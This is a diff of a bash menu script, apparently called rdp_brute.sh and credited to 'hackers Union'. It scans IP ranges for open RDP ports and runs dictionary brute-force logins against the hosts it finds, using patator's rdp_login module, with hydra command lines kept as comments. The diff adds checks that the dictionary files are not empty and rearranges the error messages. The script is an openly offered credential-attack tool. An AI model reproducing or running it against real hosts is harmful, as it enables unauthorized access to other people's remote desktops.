@@ -80,7 +80,7 @@ clear
 echo -e       "$grey                     +-------------------------------------+"
 echo -e       "$grey                     |            Auto  Script             |"
 echo -e "$aquamarine                     |    by GetDrive & hackers Union      |" 
-echo -e        "$red                     |          Version 1.11beta           |"
+echo -e        "$red                     |            Version 1.11             |"
 echo -e        "$red                     +-------------------------------------+ $colorbase"
 #####################################CHECKLANGUAGE####################################
 CHECKLANGUAGE ()
@@ -321,6 +321,16 @@ if [ "$brutmenu" = "1" ]; then
 echo -e "$aquamarine*******************************************************************************$green"
 read -p "*Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "*Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
+if [ -s $passlist ]; then
+echo ""
+else
+echo -e "\n$red***ОШИБКА! Неверно указан логин или файл с паролями"
+echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
+read -p ""
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi
 
 clear
 echo -e "                               $green Запуск брутфорса"
@@ -333,10 +343,8 @@ python patator.py rdp_login host=FILE0 user=$loginbrute password=FILE1 0=open338
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 clear
 TESTRESULTRU
-echo -e "\n$red***ОШИБКА! Неверно указан логин или файл с паролями"
-echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
-read -p ""
-
+./rdp_brute.sh
+exit;
 ./rdp_brute.sh
 fi
 
@@ -345,6 +353,17 @@ if [ "$brutmenu" = "2" ]; then
 echo -e "$aquamarine*******************************************************************************$green"
 read -p "*Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "*Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
+if [ -s $passbrute ]; then
+echo ""
+else
+echo -e "\n$red***ОШИБКА! Неверно указан пароль или файл с логинами"
+echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
+read -p ""
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi
+
 clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
@@ -355,12 +374,7 @@ python patator.py rdp_login host=FILE0 user=FILE1 password=$passbrute 0=open3389
 #hydra -L $loginlist -p $passbrute -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 clear
-TESTRESULTRU
-echo -e "\n$red***ОШИБКА! Неверно указан файл с логинами или не указан пароль"
-echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
-read -p ""
 
-./rdp_brute.sh
 fi
 
 
@@ -368,6 +382,17 @@ if [ "$brutmenu" = "3" ]; then
 echo -e "$aquamarine*******************************************************************************$green"
 read -p "*Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "*Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
+if [ -s $passlist -a -s $loginlist ]; then
+echo ""
+else
+echo -e "\n$red***ОШИБКА! Неверно указан файл с логинами или с паролями"
+echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
+read -p ""
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi
+
 clear
 echo -e "                               $green Запуск брутфорса"
 echo ""
@@ -379,10 +404,10 @@ python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$l
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 clear
 TESTRESULTRU
-echo -e "\n$red***ОШИБКА! Неверно указан файл с логинами или файл с паролями"
-echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
-read -p ""
-
+echo -e "$red Файл с целями пустой$colorbase"
+sleep 2
+./rdp_brute.sh
+exit;
 ./rdp_brute.sh
 fi
 
@@ -401,18 +426,14 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 clear
 TESTRESULTRU
-
-
-echo -e "\n$red***ОШИБКА! Файл с целями пустой"
-echo -e "\n$aquamarine*Нажмите $red[ENTER]$aquamarine для перехода в Главное меню $colorbase "
-read -p ""
-
+./rdp_brute.sh
+exit;
 ./rdp_brute.sh
 fi
 
 if [ "$brutmenu" = "5" ]; then
 echo ""
-./rdp_brute.sh
+
 exit;
 ./rdp_brute.sh
 fi
@@ -437,7 +458,17 @@ if [ "$brutmenu" = "1" ]; then
 echo -e "$aquamarine*******************************************************************************$green"
 read -p "*Enter username {administrator, admin & etc.} : " loginbrute
 read -p "*Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-
+if [ -s $passlist ]; then
+echo ""
+else
+TESTRESULTEN
+echo -e "\n$red***ERROR! Incorrect login or password file"
+echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase "
+read -p ""
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi
 clear
 echo -e "                              $green Start bruteforceing"
 echo ""
@@ -448,12 +479,7 @@ python patator.py rdp_login host=FILE0 user=$loginbrute password=FILE1 0=open338
 #hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 clear
-TESTRESULTEN
-echo -e "\n$red***ERROR! Incorrect login or password file"
-echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase "
-read -p ""
 
-./rdp_brute.sh
 fi
 
 
@@ -461,6 +487,18 @@ if [ "$brutmenu" = "2" ]; then
 echo -e "$aquamarine*******************************************************************************$green"
 read -p "*Enter the path to username dictionary {'/home/dictionary/users'}: " loginlist
 read -p "*Enter the password {administrator, admin, 123456 & etc.} : " passbrute
+if [ -s $loginlist ];
+then
+echo ""
+else
+echo -e "\n$red***ERROR! Incorrect file with login and password unknown"
+echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase "
+read -p ""
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi
+
 clear
 echo -e "                              $green Start bruteforceing"
 echo ""
@@ -472,11 +510,7 @@ python patator.py rdp_login host=FILE0 user=FILE1 password=$passbrute 0=open3389
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 clear
 TESTRESULTEN
-echo -e "\n$red***ERROR! Incorrect file with login and password unknown"
-echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase "
-read -p ""
 
-./rdp_brute.sh
 fi
 
 
@@ -484,6 +518,17 @@ if [ "$brutmenu" = "3" ]; then
 echo -e "$aquamarine*******************************************************************************$green"
 read -p "*Enter the path to username dictionary {'/home/dictionary/users'}: " loginlist
 read -p "*Enter the path to passwords dictionary {'/home/dictionary/pass'}: " passlist
+if [ -s $loginlist -a -s $passlist ]; then
+echo ""
+else
+echo -e "\n$red***ERROR! Incorrect file with logins and passwords file"
+echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase "
+read -p ""
+./rdp_brute.sh
+exit;
+./rdp_brute.sh
+fi
+
 clear
 echo -e "                              $green Start bruteforceing"
 echo ""
@@ -495,11 +540,7 @@ python patator.py rdp_login host=FILE0 user=FILE1 password=FILE2 0=open3389 1=$l
 trap 'echo "Return to Main menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 clear
 TESTRESULTEN
-echo -e "\n$red***ERROR! Incorrect file with logins and passwords file"
-echo -e "\n$aquamarine*Press $red[ENTER] $aquamarine to return to the Main menu $colorbase "
-read -p ""
 
-./rdp_brute.sh
 fi
 
 
@@ -578,6 +619,8 @@ else
 if [ "$menuoption" = "2" ]; then
 echo -e "$aquamarine*******************************************************************************$green"
 read -p "*Введите путь к файлу с диапазонами IP {list.txt,list..& etc.} : " listname
+
+
 clear
 echo -e "$red-------------------------------------------------------------------------------$colorbase"
 echo -e "$aquamarine                     Идет поиск открытых RDP. Ожидайте.$colorbase"
